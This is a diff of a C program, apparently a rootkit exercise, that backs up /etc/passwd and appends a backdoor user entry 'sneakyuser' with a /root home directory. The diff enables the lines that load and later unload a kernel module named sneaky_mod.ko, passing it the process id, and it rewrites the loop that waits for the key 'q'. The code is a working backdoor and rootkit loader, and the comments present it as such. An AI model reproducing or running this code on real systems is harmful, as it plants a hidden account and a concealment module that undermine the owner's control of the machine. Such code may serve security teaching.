@@ -12,17 +12,19 @@ int main(void){
   system("cp /etc/passwd /tmp/passwd");
   system("echo \'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\' >> /etc/passwd");
   
-  // 3. load sneaky module
-  /*char message[50];
-  sprintf(message, "insmod sneaky_mod.ko pid=%d", getpid());
+  // 3. load the sneaky module (sneaky_mod.ko)
+  char message[80];
+  sprintf(message, "insmod sneaky_mod.ko pid = %d", getpid());
   system(message);
 
-  // 4. while loop
+  // 4. reading a character at a time from the keyboard until it receives the character ‘q’ (for quit)
   int inputChar;
-  while ((inputChar = getchar()) != 'q');
+  do{
+    inputChar = getchar();
+  }while (inputChar != 'q');
 
   // 5. unload sneaky module
-  system("rmmod sneaky_mod");*/
+  system("rmmod sneaky_mod");
 
   // 6. restore the /etc/passwd file by copying /tmp/passwd to /etc/passwd
   system("cp /tmp/passwd /etc/passwd");
